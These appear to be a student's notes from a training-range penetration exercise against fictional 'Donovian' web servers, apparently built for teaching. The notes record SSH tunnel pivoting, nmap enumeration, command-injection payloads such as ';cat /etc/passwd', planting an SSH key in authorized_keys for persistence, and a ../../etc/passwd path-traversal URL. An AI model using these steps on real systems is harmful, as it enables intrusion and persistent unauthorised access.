
linux float : 10.50.24.121
win float : 10.50.27.70
Stack Number Username Password jump
1 NICH-012-M SHXACZ5bb3caaPn 10.50.28.6

OBJ: gain access to ministry of Industry web servers
    host: Donovian_MI_websvr
Scenario Credentials: FLAG = W3B3xpl01t5t@rt0F@ct1v1ty

Scheme of Maneuver:
>Jump Box: 10.50.28.6
->T1:10.100.28.40 [Donovian_MI_websvr]

ssh -MS /tmp/jump student@10.50.28.6
  socket for jump
ssh -S /tmp/jump jump -O forward -D9050
  proxychians to jump
proxychains nmap 10.100.28.40
  Nmap scan report for 10.100.28.40
  Host is up (0.00051s latency).
  Not shown: 998 closed ports
  PORT     STATE SERVICE
  80/tcp   open  http
  4444/tcp open  krb524

proxychains nc 10.100.28.40 80
  HTTP/1.1 400 Bad Request
  Date: Wed, 15 Jan 2025 18:09:35 GMT
  Server: Apache/2.4.29 (Ubuntu)
  Content-Length: 306
  Connection: close
  Content-Type: text/html; charset=iso-8859-1
  
  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
  <html><head>
  <title>400 Bad Request</title>
  </head><body>
  <h1>Bad Request</h1>
  <p>Your browser sent a request that this server could not understand.<br />
  </p>
  <hr>
  <address>Apache/2.4.29 (Ubuntu) Server at mi.web.donovia Port 80</address>
  </body></html>

proxychains nc 10.100.28.40 4444
   SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3

ssh  -S /tmp/jump jump -O forward -L1111:10.100.28.40:80
    create tunnel to access website 

firefox 
 opens browser
127.0.0.1:1111
  access webpage from jump
  MI homepage

proxychains nmap -Pn -p 80 --script http-enum.nse 10.100.28.40  
  http directory pages
    /robots.txt
    /css
      web design assets 
    /images
        .jpeg for the site
    /uploads  [there are two uploads fields]
      /message
        Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
      Please send me a corrected cert with the right now.
      I took my online training from the following website
      10.100.28.55
    /net_test
      /industry_check.php
        leads to input fields
          testing for arbitrary command execution
            ;pwd [path to test field returned]
              /var/www/html/net_test /var/www/html/net_test
            ;whoami
              billybob billybob
            ;ls /var/www/html [adds to available pages]
              Contract_bids.html TT css db_recover.php fileUpload.php images index.html net_test robots.txt style.css uploads uploads
            ;cat /etc/passwd
                gives flag [vLbGLaEwmomnLNvftvsr]
                home directory of billybob
                  /home/billybob
      /Contract_bids.html
        gives email
          Ms. Natasha Romanoff at N.Romanoff@MI.ru
      /TT
        leads to /Contract_bids.html
      /index.html
        homepage
          
further enumeration of Robots.txt will add to this list

trainig website enumeration
proxychains nmap -Pn -p 80 --script http-enum.nse 10.100.28.55
 closed from jump
proxychains nc 10.100.28.55 80
 time out 
likely need to access to T1 first

from linops
ssh-keygen -t rsa
cat /home/student/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD0aAF+kg4aGvAKsd7hOmTnZTnB0dHbYFe0JOlPQXxYmLiGLZ3wKFsHqcKkxYpJ2TK8IPI2ye5lRakE4H1fNmP7V2dRbD9L0SHL2G4XUKdqUVq0+YzsLlWB+lMlUiHCDVinPE+8uSPrxsi9PNr7pAnaCxFDQlo6To63oCEj1HxiX+U1G9enZyjoDQBD3yT9B01QdrVvKID5FEpqYZWPQO+xRe2Vzcoqo0MKYC6Sy7N315ih+1rIO4ra3YTTkzKMbnp0nuNoDRscFJg+isabZoElbMypYtUTnPnMFN4ehv8BnAwelbTR7vP8GFE7KZV/+U7kjK6lTQnhaZ5ibJ9FKHXl student@lin-ops
from command execution
check for .ssh directory in home if none creat
  ;mkdir /home/billybob/.ssh
make an auth keys file and put your key in it
   ;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD0aAF+kg4aGvAKsd7hOmTnZTnB0dHbYFe0JOlPQXxYmLiGLZ3wKFsHqcKkxYpJ2TK8IPI2ye5lRakE4H1fNmP7V2dRbD9L0SHL2G4XUKdqUVq0+YzsLlWB+lMlUiHCDVinPE+8uSPrxsi9PNr7pAnaCxFDQlo6To63oCEj1HxiX+U1G9enZyjoDQBD3yT9B01QdrVvKID5FEpqYZWPQO+xRe2Vzcoqo0MKYC6Sy7N315ih+1rIO4ra3YTTkzKMbnp0nuNoDRscFJg+isabZoElbMypYtUTnPnMFN4ehv8BnAwelbTR7vP8GFE7KZV/+U7kjK6lTQnhaZ5ibJ9FKHXl student@lin-ops" >> /home/billybob/.ssh/authorized_keys  ### where 'Public Key' copy and paste ssh key created earlier

make a tunnel for T1 to target 2 over port 4444 [ssh]
from linops
ssh  -S /tmp/jump jump -O forward -L1112:10.100.28.40:4444
ssh billybob@127.0.0.1 -p 1112

looking for N.Romanoff file with companies that work on sensitive projects
  cd into romanoffs home directory 
  cat the contracts file 
    flag: 4A3mV09w4NUNb6lITCl0

make a tunnel to reach t2
ssh -MS /tmp/t1 billybob@127.0.0.1 -p1112
ssh -S /tmp/t1 t1 -O forward -L 2111:10.100.28.55:80
 move proxychains to t1
    ssh -S /tmp/jump jump -O cancel -D9050
    ssh -S /tmp/t1 t1 -O forward -D9050
enumerate t2
   proxychains nmap 10.100.28.55 -T4 -Pn

    proxychains nmap -Pn -p 80 --script http-enum.nse 10.100.28.55
      /css
        css website assets
      /images
        picture of a book
      /js
        backend scripts
firefox 
  127.0.0.1:2111
    used forced relative path through html get
      http://127.0.0.1:2111/books_pick.php?book=../../../../../../../../../../etc/passwd






















